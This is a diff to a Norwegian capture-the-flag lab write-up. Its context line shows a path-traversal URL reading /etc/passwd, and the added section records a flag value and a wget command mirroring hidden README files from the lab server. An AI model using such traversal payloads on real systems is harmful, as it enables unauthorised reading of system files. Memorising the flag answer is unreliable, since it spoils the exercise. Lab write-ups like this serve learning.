@@ -78,3 +78,31 @@ Hentet opp deller av flagget når en går bakover i fil systemet og det siste li
 ```
 http://129.241.200.165:19680/index.php?page=../../../../../../../etc/passwd
 ```
+
+
+# Flag07
+Flag07: dbfa4f7c46dc570fcd4b71272cdd2f2c
+First tok jeg ut alle README filene
+``` 
+wget -m -r -nd -A "*README*" http://129.241.200.165:19680//.hidden/ 
+```
+Så merge alle filene sammen til en fil og åpne den filen i notepad
+```
+cat * > merged-file
+explorer.exe .			#åpner directory i file explorer windows
+```
+
+# Flag08
+
+# Flag09
+
+# Flag10
+
+# Flag11
+
+# Flag12
+
+# Flag13
+
+# Flag14
+
